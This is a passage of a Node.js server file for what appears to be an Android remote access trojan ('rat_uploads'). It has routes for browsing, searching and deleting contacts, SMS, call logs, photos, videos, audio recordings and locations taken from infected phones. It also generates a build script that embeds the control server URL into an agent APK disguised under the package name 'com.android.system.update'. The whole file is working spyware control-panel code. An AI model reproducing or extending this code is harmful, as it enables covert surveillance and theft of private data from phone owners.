        { sharedWith: adminId }
      ]
    }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    let contacts = (device.data?.contacts || []);
    if (q) {
      const lower = q.toLowerCase();
      contacts = contacts.filter(c => 
        (c.name && c.name.toLowerCase().includes(lower)) ||
        (c.phones && c.phones.some(p => p.number && p.number.includes(q)))
      );
    }
    res.json(contacts);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Search SMS
app.get('/api/devices/:deviceId/search/sms', authMiddleware, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { q } = req.query;
    const adminId = getAdminId(req);
    const device = await Device.findOne({
      deviceId,
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    let sms = (device.data?.sms || []);
    if (q) {
      const lower = q.toLowerCase();
      sms = sms.filter(m => 
        (m.address && m.address.toLowerCase().includes(lower)) ||
        (m.body && m.body.toLowerCase().includes(lower))
      );
    }
    res.json(sms);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Search Call Logs
app.get('/api/devices/:deviceId/search/callLogs', authMiddleware, async (req, res) => {
  try {
    const { deviceId } = req.params;
    const { q } = req.query;
    const adminId = getAdminId(req);
    const device = await Device.findOne({
      deviceId,
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    let calls = (device.data?.callLogs || []);
    if (q) {
      const lower = q.toLowerCase();
      calls = calls.filter(c => 
        (c.name && c.name.toLowerCase().includes(lower)) ||
        (c.number && c.number.includes(q))
      );
    }
    res.json(calls);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== MEDIA UPLOAD (from admin) =====
app.post('/api/upload', authMiddleware, upload.single('file'), async (req, res) => {
  try {
    const file = req.file;
    if (!file) return res.status(400).json({ error: 'No file uploaded' });

    const result = await cloudinary.uploader.upload(file.path, {
      folder: 'rat_uploads',
      resource_type: 'auto'
    });

    // Clean up temp file
    fs.unlink(file.path, () => {});

    res.json({
      url: result.secure_url,
      publicId: result.public_id,
      format: result.format,
      bytes: result.bytes
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== DELETE DEVICE =====
app.delete('/api/devices/:deviceId', authMiddleware, async (req, res) => {
  try {
    const adminId = getAdminId(req);
    const device = await Device.findOneAndDelete({ deviceId: req.params.deviceId, adminId });
    if (!device) return res.status(404).json({ error: 'Device not found' });
    io.emit('device:offline', { deviceId: req.params.deviceId });
    res.json({ success: true, message: 'Device deleted' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== DELETE SINGLE DATA ITEM from device data (e.g. single contact, sms, call) =====
app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, async (req, res) => {
  try {
    const { deviceId, dataType, itemId } = req.params;
    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations'].includes(dataType)) {
      return res.status(400).json({ error: 'Invalid data type' });
    }
    const adminId = getAdminId(req);
    const device = await Device.findOne({ deviceId, adminId }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    
    const dataKey = `data.${dataType}`;
    // Try to remove by id field first, then by publicId for photos
    const result = await mongoose.connection.db.collection('devices').updateOne(
      { deviceId },
      { $pull: { [dataKey]: { $or: [{ id: itemId }, { publicId: itemId }] } } }
    );
    
    // Also delete from Cloudinary if it was a captured photo or video
    if (dataType === 'capturedPhotos' || dataType === 'photos' || dataType === 'videos') {
      try { await cloudinary.uploader.destroy(itemId); } catch (e) {}
    }
    
    res.json({ success: true, modified: result.modifiedCount });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== DELETE ALL DATA OF A TYPE from device =====
app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
  try {
    const { deviceId, dataType } = req.params;
    if (!['contacts', 'sms', 'callLogs', 'capturedPhotos', 'photos', 'videos', 'documents', 'locations', 'installedApps', 'lastPhoto', 'recordedAudios'].includes(dataType)) {
      return res.status(400).json({ error: 'Invalid data type' });
    }
    const adminId = getAdminId(req);

    // If capturedPhotos, also delete from Cloudinary
    if (dataType === 'capturedPhotos') {
      const device = await Device.findOne({ deviceId, adminId }).lean();
      if (device?.data?.capturedPhotos) {
        const photos = device.data.capturedPhotos instanceof Map 
          ? Array.from(device.data.capturedPhotos.values()) 
          : device.data.capturedPhotos;
        for (const photo of photos) {
          if (photo.publicId) {
            try { await cloudinary.uploader.destroy(photo.publicId); } catch (e) {}
          }
        }
      }
    }
    if (dataType === 'lastPhoto') {
      const device = await Device.findOne({ deviceId, adminId }).lean();
      if (device?.data?.lastPhoto?.publicId) {
        try { await cloudinary.uploader.destroy(device.data.lastPhoto.publicId); } catch (e) {}
      }
    }
    // If videos, also delete from Cloudinary
    if (dataType === 'videos') {
      const device = await Device.findOne({ deviceId, adminId }).lean();
      if (device?.data?.videos) {
        const videos = device.data.videos instanceof Map 
          ? Array.from(device.data.videos.values()) 
          : device.data.videos;
        for (const video of videos) {
          if (video.publicId) {
            try { await cloudinary.uploader.destroy(video.publicId); } catch (e) {}
          }
        }
      }
    }
    
    const result = await mongoose.connection.db.collection('devices').updateOne(
      { deviceId, adminId },
      { $unset: { [`data.${dataType}`]: '' } }
    );
    
    res.json({ success: true, modified: result.modifiedCount });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ===== MEDIA DELETE (deletes from Cloudinary too) =====
app.delete('/api/media/:deviceId/:type', authMiddleware, async (req, res) => {
  try {
    const { deviceId, type } = req.params;
    const { publicId } = req.body;
    
    if (!publicId) {
      // Delete all media of this type for device
      const adminId = getAdminId(req);
      const device = await Device.findOne({ deviceId, adminId }).lean();
      if (!device) return res.status(404).json({ error: 'Device not found' });
      
      const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
                        type === 'videos' ? 'videos' : 
                        type === 'documents' ? 'documents' : null;
      
      if (!dataField) return res.status(400).json({ error: 'Invalid type' });
      
      // Get all items
      const items = device.data?.[dataField] || [];
      
      // Delete each from Cloudinary
      const deletePromises = items.map(async (item) => {
        const pid = item.publicId || (typeof item === 'string' ? item : null);
        if (pid) {
          try {
            await cloudinary.uploader.destroy(pid);
          } catch (e) {}
        }
      });
      await Promise.all(deletePromises);
      
      // Clear from DB
      const updateResult = await Device.updateOne(
        { deviceId, adminId },
        { $set: { [`data.${dataField}`]: [] } }
      );
      if (updateResult.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
      
      res.json({ success: true, deleted: items.length });
    } else {
      // Delete single file
      try {
        await cloudinary.uploader.destroy(publicId);
      } catch (e) {}
      
      // Remove from device data
      const dataField = type === 'photos' || type === 'capturedPhotos' ? 'capturedPhotos' : 
                        type === 'videos' ? 'videos' : 
                        type === 'documents' ? 'documents' : null;
      
      if (dataField) {
        const updateResult2 = await Device.updateOne(
          { deviceId, adminId },
          { $pull: { [`data.${dataField}`]: { publicId } } }
        );
        if (updateResult2.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
      }
      
      res.json({ success: true });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Device assignment: admin claims an unassigned device
app.post('/api/devices/:deviceId/assign', authMiddleware, async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    if (device.adminId != null && device.adminId !== '' && device.adminId !== undefined) {
      return res.status(400).json({ error: 'Device already assigned to another admin' });
    }
    const adminId = getAdminId(req);
    const updated = await Device.findOneAndUpdate(
      { deviceId: req.params.deviceId },
      { $set: { adminId } },
      { new: true }
    );
    res.json({ success: true, device: updated });
  } catch (err) {
    console.error('Assign error:', err);
    res.status(500).json({ error: err.message });
  }
});

// Delete single media item
app.delete('/api/media/:deviceId/:type/:publicId', authMiddleware, async (req, res) => {
  try {
    const { publicId } = req.params;
    
    try {
      await cloudinary.uploader.destroy(publicId);
    } catch (e) {}
    
      const adminId = getAdminId(req);
      const dataField = 'capturedPhotos';
      const updateResult3 = await Device.updateOne(
        { deviceId: req.params.deviceId, adminId },
        { $pull: { [`data.${dataField}`]: { publicId } } }
      );
    if (updateResult3.matchedCount === 0) return res.status(404).json({ error: 'Device not found or access denied' });
    
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// APK Build Routes
app.post('/api/apk/build', authMiddleware, async (req, res) => {
  try {
    const buildData = req.body;
    const buildId = uuidv4();
    
    const build = new ApkBuild({
      buildId,
      ...buildData,
      serverUrl: buildData.serverUrl || process.env.SERVER_URL || 'http://localhost:5000',
      wsUrl: buildData.wsUrl || process.env.WS_URL || 'http://localhost:5000',
      status: 'configured',
      createdAt: new Date()
    });
    await build.save();

    const buildDir = path.join(__dirname, 'builds', 'scripts');
    if (!fs.existsSync(buildDir)) {
      fs.mkdirSync(buildDir, { recursive: true });
    }

    res.json({ 
      buildId, 
      message: 'Build configuration saved.',
      status: 'configured',
      note: 'Download the android-agent directory and build locally with Android SDK.'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/apk/builds', authMiddleware, async (req, res) => {
  try {
    const builds = await ApkBuild.find().sort({ createdAt: -1 });
    res.json(builds);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
  try {
    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
    if (!build) return res.status(404).json({ error: 'Build not found' });
    res.json({
      buildId: build.buildId,
      status: build.status || 'configured',
      name: build.name,
      version: build.version,
      packageName: build.packageName,
      serverUrl: build.serverUrl,
      message: build.status === 'configured' ? 'Build configured. Run build script locally.' : '',
      createdAt: build.createdAt
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// APK Script Download - generates build script for user to run locally
app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
  try {
    const build = await ApkBuild.findOne({ buildId: req.params.buildId });
    if (!build) return res.status(404).json({ error: 'Build not found' });

    const safeName = (build.name || 'app').replace(/[^a-zA-Z0-9_]/g, '_');
    const serverUrl = build.serverUrl || process.env.SERVER_URL || 'http://localhost:5000';
    const wsUrl = build.wsUrl || serverUrl;

    const script = `#!/bin/bash
# ============================================
# Build Script for: ${build.name || 'Android Agent'}
# Package: ${build.packageName || 'com.android.system.update'}
# Version: ${build.version || '1.0.0'}
# Server URL: ${serverUrl}
# Generated: ${new Date().toISOString()}
# ============================================

set -e

echo "============================================"
echo " Building APK: ${build.name || 'Android Agent'}"
echo " Package: ${build.packageName || 'com.android.system.update'}"
echo " Version: ${build.version || '1.0.0'}"
echo "============================================"

# Check for Android SDK
if [ -z "$ANDROID_HOME" ]; then
    if [ -d "$HOME/Android/Sdk" ]; then
        export ANDROID_HOME="$HOME/Android/Sdk"
    elif [ -d "$HOME/.android/sdk" ]; then
        export ANDROID_HOME="$HOME/.android/sdk"
    else
        echo "ERROR: ANDROID_HOME not set. Please install Android Studio or set ANDROID_HOME."
        exit 1
    fi
fi

echo "Using ANDROID_HOME: $ANDROID_HOME"

# Check for Java
if ! command -v java &> /dev/null; then
    echo "ERROR: Java not found. Please install JDK 17+."
    exit 1
fi

JAVA_VER=$(java -version 2>&1 | head -1 | cut -d'"' -f2 | cut -d'.' -f1)
echo "Java version: $(java -version 2>&1 | head -1)"

PROJECT_DIR="$(cd "$(dirname "$0")" && pwd)"
AGENT_DIR="$PROJECT_DIR/android-agent"

if [ ! -d "$AGENT_DIR" ]; then
    echo "ERROR: android-agent directory not found in $PROJECT_DIR"
    echo "Please place this script in the same folder as the android-agent/ directory."
    exit 1
fi

# Write config to strings.xml
STRINGS_FILE="$AGENT_DIR/app/src/main/res/values/strings.xml"
if [ -f "$STRINGS_FILE" ]; then
    echo "Updating server URL in strings.xml..."
    sed -i "s|<string name=\"server_url\">.*</string>|<string name=\"server_url\">${serverUrl}</string>|" "$STRINGS_FILE"
    sed -i "s|<string name=\"ws_url\">.*</string>|<string name=\"ws_url\">${wsUrl}</string>|" "$STRINGS_FILE"
    echo "Server URL set to: ${serverUrl}"
fi

# Build the APK
echo ""
echo "Building APK..."
cd "$AGENT_DIR"

if [ -f "./gradlew" ]; then
    chmod +x ./gradlew
    ./gradlew assembleRelease --no-daemon
else
    echo "ERROR: gradlew not found. Please use Android Studio or ensure gradlew exists."
    exit 1
fi

APK_PATH="$AGENT_DIR/app/build/outputs/apk/release/app-release.apk"
DEBUG_APK_PATH="$AGENT_DIR/app/build/outputs/apk/debug/app-debug.apk"

if [ -f "$APK_PATH" ]; then
    echo ""
    echo "============================================"
    echo " BUILD SUCCESSFUL!"
    echo "============================================"
    echo "APK location: $APK_PATH"
    echo ""
    echo "Install on device with:"
    echo "  adb install -r \"$APK_PATH\""
    echo ""
    echo "Or for debug build:"
    echo "  adb install -r \"$DEBUG_APK_PATH\""
elif [ -f "$DEBUG_APK_PATH" ]; then
    echo ""
    echo "============================================"
    echo " BUILD SUCCESSFUL (debug only)!"
    echo "============================================"
    echo "APK location: $DEBUG_APK_PATH"
    echo ""
    echo "Install with:"
    echo "  adb install -r \"$DEBUG_APK_PATH\""
else
    echo ""
    echo "============================================"
    echo " BUILD COMPLETED"
    echo "============================================"
    echo "Check build output in: $AGENT_DIR/app/build/outputs/apk/"
fi

echo ""
echo "To install on connected device:"
echo "  adb install -r \"$AGENT_DIR/app/build/outputs/apk/release/app-release.apk\" 2>/dev/null || \\"
echo "  adb install -r \"$AGENT_DIR/app/build/outputs/apk/debug/app-debug.apk\""
`;

    res.setHeader('Content-Type', 'application/x-sh');
    res.setHeader('Content-Disposition', `attachment; filename="build_apk_${safeName}.sh"`);
    res.send(script);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Stats Routes
app.get('/api/stats', authMiddleware, async (req, res) => {
  try {
    const totalDevices = await Device.countDocuments();
    const onlineDevices = await Device.countDocuments({ status: 'online' });
    const todayNew = await Device.countDocuments({
      firstSeen: { $gte: new Date(new Date().setHours(0,0,0,0)) }
    });
    
    res.json({
      totalDevices,
      onlineDevices,
      todayNew,
      totalCommands: 0
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, res) => {
  try {
    const { deviceId, dataType } = req.params;
    const adminId = getAdminId(req);
    const device = await Device.findOne({
      deviceId,
      $or: [
        { adminId },
        { sharedWith: adminId }
      ]
    }).lean();
    if (!device) return res.status(404).json({ error: 'Device not found' });
    const data = device.data || {};
    if (data instanceof Map) {
      return res.json(data.get(dataType) || []);
    }
    res.json(data[dataType] || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`WebSocket server ready`);
});